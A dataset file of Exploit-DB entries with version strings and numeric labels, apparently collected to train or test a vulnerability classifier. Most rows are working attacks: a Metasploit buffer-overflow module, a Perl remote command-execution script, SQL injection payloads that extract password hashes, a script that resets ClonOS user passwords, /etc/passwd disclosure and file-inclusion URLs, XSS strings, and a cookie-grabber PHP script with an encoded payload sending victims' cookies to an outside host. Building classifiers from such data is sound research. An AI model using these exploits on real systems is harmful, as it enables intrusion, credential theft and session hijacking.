18547,"DJ Studio Pro 5.1 - '.pls' Local Stack Buffer Overflow (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::FILEFORMAT 	include Msf::Exploit::Remote::Seh  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'DJ Studio Pro 5.1 .pls Stack Buffer Overflow', 			'Description'    => %q{ 					This module exploits a stack-based buffer overflow in DJ Studio Pro 5.1.6.5.2. 				When handling a .pls file, DJ Studio will copy the user-supplied data on the stack 				without any proper bounds checking done beforehand, therefore allowing code 				execution under the context of the user. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'Sebastien Duquette', 					'Death-Shadow-Dark <death.shadow.dark[at]gmail.com>', 				], 			'References'     => 				[ 					[ 'CVE', '2009-4656'], 					[ 'OSVDB', '58159'], 					[ 'URL', 'http://www.exploit-db.com/exploits/10827' ] 				], 			'Payload'        => 				{ 					'Space'    => 5000, 					'BadChars' => ""\x00\x0a\x3d"", 					'StackAdjustment' => -3500, 				}, 			'Platform' => 'win', 			'Targets'        => 				[ 					# POP EBX # POP ECX # RET 8 					# DJStudioPro.exe 					[ 'DJ Studio Pro 5.1.6.5.2', { 'Ret' => 0x014FC62D } ], 				], 			'Privileged'     => false, 			'DisclosureDate' => 'Dec 30 2009', 			'DefaultTarget'  => 0))  			register_options( 				[ 					OptString.new('FILENAME', [ true, 'The file name.',  'msf.pls']), 				], self.class)  	end  	def exploit  		sploit = rand_text_alpha_upper(1308) 		sploit << generate_seh_payload(target.ret) 		sploit << rand_text_alpha_upper(10000)  		print_status(""Creating '#{datastore['FILENAME']}' file ..."")  		file_create(sploit)  	end  end","['5.1', '5.1.6.5.2']",1
19691,"Tony Greenwood WebWho+ 1.1 - Remote Command Execution source: https://www.securityfocus.com/bid/892/info  WebWho+ is a free cgi script written by Tony Greenwood for executing whois queries via the www. Though it does perform checks for shell escape characters on some parameters, it misses the 'type' variable and allows for malicious input to be sent to a shell. It is possible to execute arbitrary commands on a webserver running WebWho+ v1.1 with the uid of the webserver (usually nobody).   #!/usr/bin/perl # # hhp-webwho.pl # WebWho+ v1.1 (whois cgi) remote exploit. # # By: loophole of hhp. # [12/26/99] # # http://hhp.perlx.com/ # loophole@hhp.perlx.com # # Advisrory: http://hhp.perlx.com/ouradvisories/hhp-webwho.txt  use IO::Socket;  if (@ARGV < 2)  {   print ""* hhp-webwho.pl\n"";   print ""* webwho.pl (whois cgi) remote exploit.\n"";   print ""* By: loophole of hhp.\n"";   print ""* loophole\@hhp.perlx.com\n"";   print ""* http://hhp.perlx.com/\n\n"";   print ""USAGE: $0 <Server> [-e <File Extention>] <Command>\n\n"";   print ""* Server         = www.example.com\n"";   print ""* File Extension = /cgi-bin/webwho.pl\n"";   print ""* Command        = Shell command\n\n"";   print ""* NOTE: Defualt <File Extension> is /cgi-bin/webwho.pl\n"";   print ""*       It only needs changing if it is not the defualt.\n\n"";   print ""* EXAMPLE: $0 www.gat.org id\n"";   print ""*      OR: $0 www.gat.org -e /jack/webwho.pl id\n"";   exit 0;  }  if ($ARGV[1] eq ""-e"")  {   if (@ARGV != 4)    {     print ""Invalid Usage!\n"";     exit 0;    }   $server     = $ARGV[0];   $saywhatnig = $ARGV[2];   $command    = $ARGV[3];  }   else    {     if (@ARGV == 2)      {       $server     = $ARGV[0];       $command    = $ARGV[1];       $saywhatnig = ""/cgi-bin/webwho.pl"";      }    }  $sock = IO::Socket::INET->new(PeerAddr => $server,                               PeerPort => 80,                                  Proto => ""tcp"") or die ""Wack connection.\n"";  $calkuhlashun = 45 + length($command);    print $sock ""POST $saywhatnig HTTP/1.1\n"";   print $sock ""Accept-Language: en-us\n"";   print $sock ""Host: $server\n"";   print $sock ""Content-Length: $calkuhlashun\n"";   print $sock ""Connection: Keep-Alive\n\n"";   print $sock 'command=X&type="";echo fukk;';   print $sock ""$command"";   print $sock "";echo fokk&Check=X\n"";   $doot = 0;    while(<$sock>)    {     s/\n//g;     s/fukk<br>/--------Exploit Stats------------/;     s/fokk<br>/-hhpfoelife-\n/;     s/<br>//g;     $foo = $_;       if ($foo =~ /---Ex/)       {        $doot = 1;       }       if ($foo =~ /-hhpfoelife-/)       {        $doot = 0;        print ""---------------------------------\n"";        exit 0;       }       if ($doot == 1)        {        print ""$foo\n"";       }      } exit 0;","['1.1', 'v1.1']",0
47398,"Hospital-Management 1.26 - 'fname' SQL Injection # Exploit Title: Hospital-Management 1.26 - 'fname' SQL Injection # Author: Cakes # Discovery Date: 2019-09-18 # Vendor Homepage: https://github.com/Mugerwa-Joseph/hospital-management # Software Link: https://github.com/Mugerwa-Joseph/hospital-management/archive/master.zip # Tested Version: 1.26 # Tested on OS: CentOS 7 # CVE: N/A  # Discription: # Simple SQL injection after application authentication.   # Type: boolean-based blind # Title: AND boolean-based blind - WHERE or HAVING clause # Payload:   fname=tester'||(SELECT 0x72516679 FROM DUAL WHERE 9119=9119 AND 1379=1379)||'&sname=tester&email=test@tester.com&phone=1123456783&address=123 happy lane&gender=Male&bloodgroup=B&birthyear=2002&btn=Add  # Type: error-based # Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) # Payload:   fname=tester'||(SELECT 0x53495778 FROM DUAL WHERE 5761=5761 AND (SELECT 9648 FROM(SELECT COUNT(*),CONCAT(0x71787a7a71,(SELECT (ELT(9648=9648,1))),0x716b786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&sname=tester&email=test@tester.com&phone=1123456783&address=123 happy lane&gender=Male&bloodgroup=B&birthyear=2002&btn=Add  # Type: time-based blind # Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) # Payload:   fname=tester'||(SELECT 0x5144494b FROM DUAL WHERE 1043=1043 AND (SELECT 1880 FROM (SELECT(SLEEP(5)))AmmF))||'&sname=tester&email=test@tester.com&phone=1123456783&address=123 happy lane&gender=Male&bloodgroup=B&birthyear=2002&btn=Add",['1.26'],1
6733,mini-pub 0.3 - File Disclosure / Code Execution mini-pub 0.3 multiple vulnerabilities  download   http://sourceforge.net/projects/mini-pub/  author     muuratsalo contact    muuratsalo[at]gmail.com  exploits 1. local file disclosure http://localhost/mini-pub.php/front-end/img.php?sFileName=http://site.com/cmd.txt?  2. local file disclosure http://localhost/mini-pub.php/front-end/cat.php?sFileName=/etc/passwd  3. command execution http://localhost/mini-pub.php/front-end/cat.php?sFileName=a%3Benv  # milw0rm.com [2008-10-12],['0.3'],1
15989,"Joomla! Component People 1.0.0 - SQL Injection People Joomla Component 1.0.0 SQL Injection Vulnerability   Name              People  Vendor            http://www.ptt-solution.com  Versions Affected 1.0.0   Author            Salvatore Fresta aka Drosophila  Website           http://www.salvatorefresta.net  Contact           salvatorefresta [at] gmail [dot] com  Date              2011-01-14  X. INDEX   I.    ABOUT THE APPLICATION  II.   DESCRIPTION  III.  ANALYSIS  IV.   SAMPLE CODE  V.    FIX    I. ABOUT THE APPLICATION ________________________  The component shows all of your people in a  professional scroll  bar  where  visitors  take the first attention to their looks and positions.   II. DESCRIPTION _______________  A parameter is not properly sanitised  before  being used in SQL queries.   III. ANALYSIS _____________  Summary:   A) SQL Injection    A) SQL Injection ________________  The id parameter is not  properly  sanitised before being used in SQL queries.  This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.   IV. SAMPLE CODE _______________  A) SQL Injection  http://site/path/index.php?option=com_people&controller=people&task=details&id=-1 UNION SELECT username,password,3 FROM jos_users   V. FIX ______  No fix.",['1.0.0'],1
10287,"MundiMail 0.8.2 - Remote Code Execution # Reference: http://www.ccat.edu.mx/advisors/advisor5/advisor5.html # Credits: Ccat Research Labs   - México - Coatepec, Ver.  www.ccat.edu.mx  # Software Link: http://sourceforge.net/projects/mundimail/ # Tested on: Debian, Centos & Windows Server 2000  Preview:  Code uses System() and Exec() without good practices in security.   1.- First Vulnerable Code  //need to kill daemon 		$cmd = ""/bin/kill""; 		$cmd .= "" "" . $_REQUEST[""mypid""]; 		system($cmd);  2.- Explotation  /admin/satus/index.php?mypid=command;   3.- Fixation   $cmd .= "" "" . escapeshellcmd($_REQUEST[""mypid""]);  4.- Second Vulnerable Code  $cmd = ROOTDIR . ""include/massmail.php""; 		$cmd .= ' ' . $_REQUEST[""idtag""]; 		$cmd .= ' > /dev/null'; 		$cmd .= ' &'; 		echo $cmd . ""<br>\n""; 		exec($cmd); 		$mid = ""../mail/success.php"";  5.- Explotation  /admin/status/index.php?idtag=command;   6.-fixation  $cmd .= ' ' . escapeshellcmd($_REQUEST[""idtag""]);   7.- Other  We Can use other types of Fixation bug this is an easy one ;)   8.- Greetz  www[dot]seguridadblanca[dot]com   -------------- Happy Hacking --------------",['0.8.2'],1
47544,"ClonOs WEB UI 19.09 - Improper Access Control # Exploit Title: ClonOs WEB UI 19.09 - Improper Access Control # Date: 2019-10-19 # Exploit Author: İbrahim Hakan Şeker # Vendor Homepage: https://clonos.tekroutine.com/ # Software Link: https://github.com/clonos/control-pane # Version: 19.09 # Tested on: ClonOs # CVE : 2019-18418   import requests from bs4 import BeautifulSoup import sys  def getUser(host):     reg=r'\""'     r1 = requests.post(host+""/json.php"",data={""mode"":""getJsonPage"",""path"":""/users/"",""hash"":"""",""db_path"":""""},headers={""X-Requested-With"":""XMLHttpRequest""})     r1_source = BeautifulSoup(r1.content,""lxml"")     for k in r1_source.findAll(""tr""):         for i in k.findAll(""td"")[0]:             print(f""[+]User Found: {i}  User id: {k.get('id').replace(reg,'')}"") def changePassword(host,user,password,id):     data={         ""mode"":""usersEdit"",         ""path"":""/users/"",         ""hash"":"""",         ""db_path"":"""",         ""form_data[username]"":f""{user}"",         ""form_data[password]"":f""{password}"",         ""form_data[password1]"":f""{password}"",         ""form_data[first_name]"":"""",         ""form_data[last_name]"":"""",         ""form_data[actuser]"":""on"",         ""form_data[user_id]"": int(id)         }     r2=requests.post(host,data=data,headers={""X-Requested-With"":""XMLHttpRequest""})     if r2.status_code==200:print(""[+]OK"")     else:print(""[-]Fail"") if __name__==""__main__"":     if len(sys.argv)>1:         if ""getUser"" in sys.argv[1]:getUser(sys.argv[2])         elif ""changePassword"" in sys.argv[1]:changePassword(sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5])         else:print(""Fail parameter"")     else:print(""Usage: exploit.py getUser [http://ip_adres]\nexploit.py changePassword [http://ip_adres] [username] [new_password] [user_id]"")",['19.09'],1
22318,"Webchat 0.77 - 'Defines.php' Remote File Inclusion source: https://www.securityfocus.com/bid/7000/info  Webchat is prone to an issue that may allow remote attackers to include files located on attacker-controlled servers.  This vulnerability is as a result of insufficient sanitization performed on remote user-supplied data. Under some circumstances, it is possible for remote attackers to influence the path for certain include files to point to an external file by manipulating URI parameters.  If the remote file is a malicious file, this may be exploited to execute arbitrary system commands in the context of the web server.  http://www.example.com/defines.php?WEBCHATPATH=http://www.target.com/db_mysql.php http://www.example.com/defines.php?WEBCHATPATH=http://www.target.com/language/english.php",['0.77'],1
47728,"Nsauditor 3.1.8.0 - 'Name' Denial of Service (PoC) # Exploit Title: Nsauditor 3.1.8.0 - 'Name' Denial of Service (PoC) # Discovery by: SajjadBnd # Date: 2019-11-30 # Vendor Homepage: http://www.nsauditor.com # Software Link: http://www.nsauditor.com/downloads/nsauditor_setup.exe # Tested Version: 3.1.8.0 # Vulnerability Type: Denial of Service (DoS) Local # Tested on OS: Windows 10 - Pro  # About App # Nsauditor Network Security Auditor is a powerful network security tool designed to scan networks and hosts for vulnerabilities,  # and to provide security alerts.Nsauditor network auditor checks enterprise network for all potential methods that  # a hacker might use to attack it and create a report of potential problems that were found , Nsauditor network auditing  # software significantly reduces the total cost of network management in enterprise environments by enabling  # IT personnel and systems administrators gather a wide range of information from all the computers in the network without  # installing server-side applications on these computers and create a report of potential problems that were found.  # PoC # 1.Run the python script, it will create a new file ""dos.txt"" # 3.Run Nsauditor and click on ""Register -> Enter Registration Code"" # 2.Paste the content of dos.txt into the Field: 'Name' # 6.click 'ok' # 5.Crashed ;)   #!/usr/bin/env python buffer = ""\x41"" * 1000 try:     f=open(""dos.txt"",""w"")     print ""[+] Creating %s bytes DOS payload.."" %len(buffer)     f.write(buffer)     f.close()     print ""[+] File created!"" except:     print ""File cannot be created""",['3.1.8.0'],1
22045,"Working Resources BadBlue 1.7.1 - Search Page Cross-Site Scripting source: https://www.securityfocus.com/bid/6253/info  The ext.dll ISAPI does not sufficiently sanitize user-supplied input when processing search queries. This may allow an attacker to create a custom URL containing script code that, when viewed in a browser by a legitimate user, will result in the execution of the script code.   ');alert(document.cookie);// ')"" style=""left:expression(eval('alert(document.cookie)'))"">",['1.7.1'],1
8819,"small pirate 2.1 - Cross-Site Scripting / SQL Injection *********************************************************************************************** *********************************************************************************************** **	       										     ** **  											     ** **     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    ** **     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    ** ** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    ** **  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\  **==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>-- **  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/     [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    ** **							                                     ** **    											     ** **                          Â¡VIVA SPAIN!...Â¡GANAREMOS EL MUNDIAL!...o.O                      ** **					Â¡PROUD TO BE SPANISH!				     ** **											     ** *********************************************************************************************** ***********************************************************************************************  ---------------------------------------------------------------------------------------------- |       	   	         MULTIPLE REMOTE VULNERABILITIES	             	     | |--------------------------------------------------------------------------------------------| |                                  |    Small Pirates v-2.1   |		 	     	     | |  CMS INFORMATION:		    --------------------------	                     	     | |										             | |-->WEB: http://spirate.net/foro/			          			     | |-->DOWNLOAD: http://spirate.net/foro/			                 		     | |-->DEMO: http://www.santiagoescraches.com.ar/index.php					     | |-->CATEGORY: CMS / Board								     | |											     | |  CMS VULNERABILITY:									     | |											     | |-->TESTED ON: firefox 3						                     | |-->DORK: ""Basado en Spirate""							             | |-->CATEGORY: SQL INJECTION VULNERABILITIES / COOKIE STEALING / BLIND SQL INJECTION          | |-->AFFECT VERSION: <= 2.1						 		     | |-->Discovered Bug date: 2009-05-10							     | |-->Reported Bug date: 2009-05-10							     | |-->Fixed bug date: N/A									     | |-->Info patch: Not fixed							             | |-->Author: YEnH4ckEr									     | |-->mail: y3nh4ck3r[at]gmail[dot]com							     | |-->WEB/BLOG: N/A									     | |-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       | |-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     | ----------------------------------------------------------------------------------------------   ######################### ////////////////////////  SQL INJECTION (SQLi):  //////////////////////// #########################   <<<<---------++++++++++++++ Condition: Nothing +++++++++++++++++--------->>>>   ------- INTRO: -------   This system is a mixed combinations.  Info by admin (quote):  ""cw*= SMF+Paquetes"" ""Spirate=cw+aÃ±adidos+reparaciones+correcciones""  ""*cw = casitaweb.""   ------------------- PROOFS OF CONCEPT: -------------------   [++] GET var --> 'id'  [++] File vuln --> 'pag1.php'   ~~~~> http://[HOST]/pag1.php?id=-1+UNION+ALL+SELECT+1,2,3,version(),5,6/*   [++] GET var --> 'id'  [++] File vuln --> 'pag1-guest.php'   ~~~~> http://[HOST]/pag1-guest.php?id=-1+UNION+ALL+SELECT+1,2,3,concat(user(),0x3A3A3A,database()),5,6/*   [++] GET var --> 'id'  [++] File vuln --> 'rss-coment_post.php'  [++] Note --> More info in source code   ~~~~> http://[HOST]/web/rss/rss-coment_post.php?id=-1+UNION+ALL+SELECT+1,2,concat(user(),0x3A3A,database()),4,5,6,version(),8/*    [++] GET var --> 'id'  [++] File vuln --> 'rss-pic-comment.php'  [++] Note --> More info in source code   ~~~~> http://[HOST]/web/rss/rss-pic-comment.php?id=-1+UNION+ALL+SELECT+1,2,3,4,current_user(),6,user(),8,9,user(),11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,version(),31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81/*   [++[Return]++] ~~~~~> user, version and database.   ---------- EXPLOITS: ----------   ~~~~> http://[HOST]/pag1.php?id=-1+UNION+ALL+SELECT+1,2,3,concat(memberName,0x3A3A3A,passwd),5,6+FROM+smf_members+WHERE+ID_MEMBER=1/*  ~~~~> http://[HOST]/pag1-guest.php?id=-1+UNION+ALL+SELECT+1,2,3,concat(memberName,0x3A3A3A,passwd),5,6+FROM+smf_members+WHERE+ID_MEMBER=1/*  ~~~~> http://[HOST]/web/rss/rss-coment_post.php?id=-1+UNION+ALL+SELECT+1,2,concat(memberName,0x3A3A3A,passwd),4,5,6,concat(memberName,0x3A3A3A,passwd),8+FROM+smf_members+WHERE+ID_MEMBER=1/*  ~~~~> http://[HOST]/web/rss/rss-pic-comment.php?id=-1+UNION+ALL+SELECT+1,2,3,4,concat(memberName,0x3A3A3A,passwd),6,concat(memberName,0x3A3A3A,passwd),8,9,concat(memberName,0x3A3A3A,passwd),11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,concat(memberName,0x3A3A3A,passwd),31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81+FROM+smf_members+WHERE+ID_MEMBER=1/*   [++[Return]++] ~~~~~> memberName:::passwd in 'members' table    ###################################### //////////////////////////////////////  COOKIE STEALING VULN (BYPASS BBCODE):  ////////////////////////////////////// ######################################   <<<<---------++++++++++++++ Condition: Post a comment +++++++++++++++++--------->>>>   ------- INTRO: -------   This system is a mixed combinations.  Info by admin (quote):  ""cw*= SMF+Paquetes"" ""Spirate=cw+aÃ±adidos+reparaciones+correcciones""  ""*cw = casitaweb.""   ------------------- PROOF OF CONCEPT: -------------------   [url][img]http://www.google.es onmouseover=while(true){alert(1);} [/img][/url]   [++[Return]++] ~~~~~> recursive alert message saying ""1""   ---------- EXPLOIT: ----------   Cookie Grabber Script --> capturethecookies.php  Example Script (Before Creat exploited.txt):  <?php $ck=$_GET[""ck""]; //Capture the cookies	  $manejador=fopen(""exploited.txt"",'a'); fwrite($manejador, ""Cookie:\r\n"".htmlentities($ck).""\r\n--EOF--\r\n""); //Save the values fclose($manejador); echo ""<script>location.href='http://[HOST]/index.php';</script>""; //Redirect... ?>  Example Hosting --> http://www.myphpcookiestealing.es/capturethecookies.php?ck=  Poisoning's comment:  [url][img]http://www.owned.owned onmouseover=document.location=String.fromCharCode(104,116,116,112,58,47,47,119,119,119,46,109,121,112,104,112,99,111,111,107,105,101,115,116,101,97,108,105,110,103,46,101,115,47,99,97,112,116,117,114,101,116,104,101,99,111,111,107,105,101,115,46,112,104,112,63,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,61)+document.cookie [/img][/url]   [++[Return]++] ~~~~~> Cookie and PHPSESSID in exploited.txt   ########################### ///////////////////////////  BLIND SQL INJECTION (SQLi):  /////////////////////////// ###########################   <<<<---------++++++++++++++ Condition: Nothing +++++++++++++++++--------->>>>   ------- INTRO: -------   This system is a mixed combinations.  Info by admin (quote):  ""cw*= SMF+Paquetes"" ""Spirate=cw+aÃ±adidos+reparaciones+correcciones""  ""*cw = casitaweb.""   ------------------- PROOFS OF CONCEPT: -------------------   [++] GET var --> 'id'  [++] File vuln --> 'index.php'   ~~~~> http://[HOST]/?type=rss;action=.xml;sa=comentarios;id=7+and+1=1 --> TRUE  ~~~~> http://[HOST]/?type=rss;action=.xml;sa=comentarios;id=7+and+1=0 --> FALSE   ---------- EXPLOITS: ----------   ~~~~> http://[HOST]/?type=rss;action=.xml;sa=comentarios;id=7+and+substring(@@version,1,1)=5 --> TRUE  ~~~~> http://[HOST]/?type=rss;action=.xml;sa=comentarios;id=7+and+substring(@@version,1,1)=4 --> FALSE    <<<-----------------------------EOF---------------------------------->>>ENJOY IT!   ####################################################################### ####################################################################### ##*******************************************************************## ##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ## ##*******************************************************************## ##-------------------------------------------------------------------## ##*******************************************************************## ## GREETZ TO: JosS, Ulises2k, J.McCray and Spanish Hack3Rs community!## ##*******************************************************************## ####################################################################### #######################################################################  # milw0rm.com [2009-05-29]",['2.1'],1
